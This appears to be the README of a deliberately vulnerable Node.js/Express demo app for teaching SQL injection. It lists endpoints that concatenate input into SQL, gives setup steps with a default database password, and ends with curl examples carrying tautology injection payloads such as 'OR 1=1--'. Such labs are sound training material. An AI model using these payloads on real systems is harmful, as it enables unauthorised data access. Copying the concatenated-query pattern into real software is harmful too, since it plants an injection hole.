# SQL Injection (Node.js)

Vulnerable Node.js API demonstrating SQL injection — same behavior as the Go [sql-injection](../sql-injection) app. Uses Express, PostgreSQL, and optional Redis cache.

## Vulnerable endpoints

- **GET /users?id=** — ID from query (concatenated into SQL)
- **POST /users/search** — JSON `{"search": "..."}` (concatenated into LIKE)
- **GET /users/name/:name** — Name from path (concatenated into SQL)

Responses include `password` (intentionally vulnerable for demos).

## Run with Docker

```bash
docker compose up --build
```

App: http://localhost:8080  
PostgreSQL: localhost:5432 (postgres/secret)  
Redis: localhost:6379  

## Run locally

1. Copy env and set DB/Redis:

   ```bash
   cp .env.example .env
   # Edit .env: DB_HOST, DB_PORT, DB_USER, DB_PASSWORD, DB_NAME; optional REDIS_ADDR
   ```

2. Ensure PostgreSQL is running (or run migrate once to create DB/table):

   ```bash
   npm install
   npm run migrate
   npm start
   ```

## Example requests

```bash
# Normal
curl "http://localhost:8080/users?id=1"
curl -X POST http://localhost:8080/users/search -H "Content-Type: application/json" -d '{"search":"admin"}'
curl "http://localhost:8080/users/name/admin"

# SQL injection examples
curl "http://localhost:8080/users?id=1 OR 1=1--"
curl -X POST http://localhost:8080/users/search -H "Content-Type: application/json" -d '{"search":"admin'\'' OR '\''1'\''='\''1"}'
curl "http://localhost:8080/users/name/admin%27%20OR%20%271%27%3D%271"
```

## License

MIT
